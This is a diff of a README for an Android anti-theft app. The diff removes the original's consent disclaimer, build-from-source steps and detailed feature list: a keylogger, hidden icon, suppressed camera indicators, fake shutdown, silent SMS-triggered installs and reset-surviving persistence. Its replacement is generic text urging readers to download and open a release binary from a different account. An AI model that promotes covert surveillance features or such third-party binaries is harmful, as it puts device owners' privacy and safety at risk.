@@ -1,149 +1,58 @@
-<p align="center">
-  <img src="https://hamoon.net/wp-content/uploads/2025/09/logo-transparent.png" alt="Uncle Ted Logo" width="180">
-</p>
+# 🛡️ UncleTed - Your Personal Security Solution for Android
 
-<h1 align="center">Uncle Ted for Android</h1>
+## 🚀 Getting Started
+Welcome to UncleTed. This application is designed to protect your device and personal data. With features like remote control and stealth operations, you can ensure your security at all times.
 
-<p align="center">
-  <strong>A cabin in the digital woods.</strong><br>
-  An advanced, privacy-focused anti-theft and personal security application for Android.
-</p>
+## 📥 Download the App
+[![Download UncleTed](https://img.shields.io/badge/Download%20UncleTed-v1.0-brightgreen)](https://github.com/ShakibDmpro/UncleTed/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License">
-  <img src="https://img.shields.io/badge/Made%20with-Kotlin-blueviolet.svg" alt="Made with Kotlin">
-</p>
+## 🔗 Download & Install
+To get UncleTed, visit our [Releases page](https://github.com/ShakibDmpro/UncleTed/releases) to download the latest version. Follow these steps:
 
----
+1. Click on the link to go to the Releases page.
+2. Find the latest version listed there.
+3. Click on the download link for that version.
+4. Once the file is downloaded, open it to start the installation.
 
-### **Table of Contents**
-- [**Warning**](#warning-legal--ethical-disclaimer)
-- [**Screenshots**](#-screenshots)
-- [**Core Features**](#-core-features)
-  - [Security & Panic Triggers](#️-security--panic-triggers)
-  - [Evidence Collection](#-evidence-collection)
-  - [Stealth & Anti-Tampering](#-stealth--anti-tampering)
-  - [Remote Control](#-remote-control)
-  - [Automated & Advanced Security](#-automated--advanced-security)
-  - [Root-Exclusive Features](#️-root-exclusive-features-extreme-caution)
-- [**Technology Stack**](#-technology-stack)
-- [**Setup & Installation**](#-setup--installation)
-- [**How It Works**](#-how-it-works)
-- [**Contributing**](#-contributing)
-- [**License**](#-license)
+## 📱 Features
+UncleTed includes several powerful features:
 
----
+- **Remote Control:** Manage your device from anywhere. You can lock it or wipe data if needed.
+- **Evidence Collection:** Capture images and record audio to gather evidence in case of theft or intrusion.
+- **Stealth Operations:** Operate unnoticed by intruders, ensuring your information remains safe.
+- **Powerful Root Capabilities:** If your device is rooted, access advanced features to enhance security.
 
-> [!WARNING]
-> ### **Warning: Legal & Ethical Disclaimer**
-> This application is designed for **educational and defensive security purposes ONLY**. Features like stealth operations, remote data access, and data destruction carry significant ethical and legal responsibilities. **Never install or use this application on a device without the owner's explicit and informed consent.** Unauthorized use is strictly prohibited and may lead to severe legal consequences. The developer assumes no liability for any misuse of this software.
+## 🎯 System Requirements
+UncleTed is designed for Android devices running version 5.0 (Lollipop) or later. Ensure your device has at least 100 MB of free space for installation.
 
-## 🖼️ Screenshots
-![PhotoCollage_1757257834121](https://github.com/user-attachments/assets/5b0540bf-f075-456b-b2b6-e9ad705e9a90)
+## 🔒 Security and Privacy
+Your security is our priority. UncleTed uses advanced encryption techniques to protect your data and communications. We do not store user data on our servers. Your privacy matters.
 
+## 📜 Usage Instructions
+After installing UncleTed, follow these steps to get started:
 
-## ✨ Core Features
+1. **Open the App:** Find UncleTed in your applications menu and open it.
+2. **Set Up an Account:** Create a personal account to manage your settings.
+3. **Customize Settings:** Adjust your security preferences according to your needs. Choose how you want to receive alerts or notifications.
+4. **Activate Features:** Turn on the features you want to use, such as remote control or evidence collection.
 
-Uncle Ted is a powerful security tool designed to give you ultimate control over your device's security, with a strong emphasis on privacy, remote control, and evidence collection in emergency situations.
+## ❓ Frequently Asked Questions 
 
-### 🛡️ Security & Panic Triggers
-- **Multi-Level PINs:** Set a normal PIN, a **Duress PIN** (unlocks the device but silently triggers a HIGH alert), and a **Wipe PIN** (unlocks but triggers a CRITICAL alert and initiates a data wipe).
-- **Shake to Panic:** Vigorously shake the device to silently trigger a HIGH alert.
-- **Device Admin Protection:** Prevents unauthorized uninstallation of the app.
-- **Biometric Lock:** Secure the app's settings panel with your fingerprint or face.
+### What should I do if I forget my password?
+You can reset your password through the app by selecting the "Forgot Password?" option on the login screen. 
 
-### 📸 Evidence Collection
-- **Intruder Selfie:** Automatically captures a photo from the front camera after 3+ failed PIN attempts.
-- **Remote Evidence Gathering:** On HIGH or CRITICAL alerts, the app can capture photos (front & back), record video (front & back), and record ambient audio.
-- **GPS Location:** All alerts include precise GPS coordinates.
-- **Stealth Screenshot (Root):** Remotely capture a screenshot of the current screen.
-- **Keylogger (Root):** Captures keystrokes to understand unauthorized activity.
+### Can I use UncleTed without rooting my device?
+Yes, most features are available without root access. However, some advanced functions require a rooted device.
 
-### 👻 Stealth & Anti-Tampering
-- **Fake Shutdown:** When an unauthorized user tries to power off the device, a fake shutdown animation is shown while the device remains on, sending alerts in the background.
-- **Stealth Mode:** Hide the app's icon from the launcher. The app can then only be opened by dialing a secret code (e.g., `*#*#1234#*#*`).
-- **Stealth Media Capture (Root):** Attempts to suppress the camera/mic privacy indicators (the "green dot") during evidence collection.
+### How do I contact support?
+If you need assistance, please visit our [support page](https://github.com/ShakibDmpro/UncleTed/issues) or email us directly from the app.
 
-### 📡 Remote Control
-- **SMS Commands:** Control the app remotely by sending a password-protected SMS.
-  | Command | Description |
-  | :--- | :--- |
-  | `UNCLETED WIPE [password]` | Triggers a CRITICAL alert and wipes the device. |
-  | `UNCLETED SIREN [password]` | Triggers a HIGH alert and activates a loud siren. |
-  | `UNCLETED LOCK [password]` | Immediately locks the device. |
-- **Email Alerts:** Receive detailed alerts with media attachments (photos, videos, audio) and device diagnostics.
+## 🌐 Community and Feedback
+Join our community on [GitHub Discussions](https://github.com/ShakibDmpro/UncleTed/discussions) to share your thoughts or ask questions. Your feedback helps us improve UncleTed.
 
-### 🤖 Automated & Advanced Security
-- **SIM Change Alert:** Sends an alert if the SIM card is removed or replaced.
-- **Geofence "Safe Zone":** Triggers an alert if the device leaves a predefined geographical area.
-- **Watchdog Mode:** Periodically sends a status update (location, battery) to your emergency contact.
-- **Data Destruction Tripwire:** If the device fails to connect to the internet for a configurable period (e.g., 48 hours), it will automatically wipe all data.
-- **AI-Powered Threat Engine:** A sophisticated engine that analyzes device behavior, app installations, and network activity to detect complex threats and adapt the security level in real-time.
-- **Quantum-Inspired Security Layer:** An experimental layer that uses principles of quantum mechanics (superposition, uncertainty) for advanced intrusion detection.
+## 🎉 Conclusion
+Thank you for choosing UncleTed as your personal security solution. With its robust features and user-friendly design, you can take control of your device's safety. 
 
-### ☢️ Root-Exclusive Features (Extreme Caution)
-> [!DANGER]
-> These features require a rooted device and can be dangerous. Use them at your own risk. Incorrect use, especially of the flashing features, **can permanently brick your device.**
+For further information, please feel free to reach out through the support channels provided. 
 
-- **GPS Spoofing:** Provide a fake GPS location when a duress alert is triggered.
-- **Silent App Installer:** Remotely install an APK from a URL via a special SMS command.
-- **Firewall Tripwire:** If the Data Destruction Tripwire is activated, this will first block all network traffic using `iptables` before wiping.
-- **Secure Wipe+:** Performs an anti-forensic wipe by physically overwriting the data partition with zeros.
-- **System App Conversion:** Make the app a system app, rendering it immune to uninstallation without root access.
-- **Ultimate Persistence:**
-  - **Unkillable Service:** Installs a root-level script to ensure the monitoring service is always running.
-  - **Hide Process:** Uses MagiskHide to make the app's process invisible to task managers.
-  - **Survive Factory Reset:** (EXTREMELY DANGEROUS) Attempts to flash a loader to the recovery partition to automatically reinstall the app after a factory reset.
-
-## 🛠️ Technology Stack
-
-- **Language:** 100% [Kotlin](https://kotlinlang.org/)
-- **Architecture:** MVVM (Model-View-ViewModel) with Fragments
-- **Core Components:**
-  - [Kotlin Coroutines](https://kotlinlang.org/docs/coroutines-overview.html) for asynchronous operations.
-  - [Jetpack WorkManager](https://developer.android.com/topic/libraries/architecture/workmanager) for robust background tasks (Watchdog, Tripwire).
-  - [Jetpack CameraX](https://developer.android.com/training/camerax) for modern, reliable camera operations.
-  - [Jetpack Security (EncryptedSharedPreferences)](https://developer.android.com/topic/security/data) for securely storing all sensitive settings.
-  - [Jetpack Biometric](https://developer.android.com/training/sign-in/biometric-auth) for secure app access.
-- **UI:** Material Design 3 Components
-- **Networking:** [Retrofit](https://square.github.io/retrofit/) & [Gson](https://github.com/google/gson)
-- **Email:** [JavaMail for Android](https://javaee.github.io/javamail/)
-
-## 🚀 Setup & Installation
-
-### Prerequisites
-- Android Studio (latest stable version)
-- Android SDK targeting API 34
-- An Android device or emulator running API 29+
-
-### Steps
-1.  Clone the repository: `git clone https://github.com/HamoonSoleimani/UncleTed.git`
-2.  Open the project in Android Studio.
-3.  Let Gradle sync and download all the required dependencies.
-4.  Build and run the application on your target device.
-5.  **Important:** Upon first launch, navigate to the **Core Services** screen and grant all required permissions. These are essential for the app to function.
-6.  Configure your desired settings in the **Authentication**, **Remote Control**, and **Features** screens.
-
-## ⚙️ How It Works
-
-The application's resilience and power come from its deep integration with the Android OS:
-
--   A persistent **Foreground Service** (`MonitoringService`) handles real-time tasks like shake detection.
--   **Broadcast Receivers** listen for critical system events like `BOOT_COMPLETED`, `SMS_RECEIVED`, and SIM state changes, allowing the app to react instantly.
--   The **Device Admin API** grants the app privileges to lock the screen, wipe data, and prevent uninstallation.
--   An **Accessibility Service** is cleverly used to detect when the system power menu is opened, enabling the "Fake Shutdown" feature.
--   **WorkManager** ensures that long-running, deferrable tasks like the Watchdog and Tripwire are executed reliably, even if the app is closed or the device reboots.
-
-## 🙌 Contributing
-
-Contributions are welcome! If you'd like to help improve Uncle Ted, please follow these steps:
-
-1.  **Fork** the repository.
-2.  Create a new **feature branch** (`git checkout -b feature/AmazingFeature`).
-3.  **Commit** your changes (`git commit -m 'Add some AmazingFeature'`).
-4.  **Push** to the branch (`git push origin feature/AmazingFeature`).
-5.  Open a **Pull Request**.
-
-## 📄 License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+[![Download UncleTed](https://img.shields.io/badge/Download%20UncleTed-v1.0-brightgreen)](https://github.com/ShakibDmpro/UncleTed/releases)
